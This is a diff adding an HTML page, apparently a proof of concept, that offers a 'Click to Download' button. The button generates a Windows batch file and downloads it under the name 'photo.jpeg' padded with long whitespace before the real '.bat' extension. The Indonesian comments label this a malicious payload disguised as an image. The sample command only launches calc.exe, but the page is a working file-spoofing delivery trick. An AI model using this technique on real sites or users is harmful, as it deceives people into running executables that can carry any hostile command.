@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+  <body style="background:#111; color:#0f0; font-family:monospace;">
+    <button id="dl">Click to Download</button>
+
+    <script>
+      document.getElementById("dl").onclick = () => {
+        // Buat payload berbahaya dengan ekstensi .bat
+        const payload = new Blob([
+          '@echo off\r\nstart calc.exe'
+        ], { type: 'text/plain' });
+
+        // Buat URL blob dari payload
+        const url = URL.createObjectURL(payload);
+
+        // Buat tag <a> untuk trigger download
+        const a = document.createElement("a");
+        a.href = url;
+
+        // Menyamarkan nama file seolah-olah gambar
+        a.download = 'photo.jpeg                                                                                                                      .bat';
+
+        // Trigger klik download
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+
+        // Revoke URL agar tidak membebani memori
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+      };
+    </script>
+  </body>
+</html>
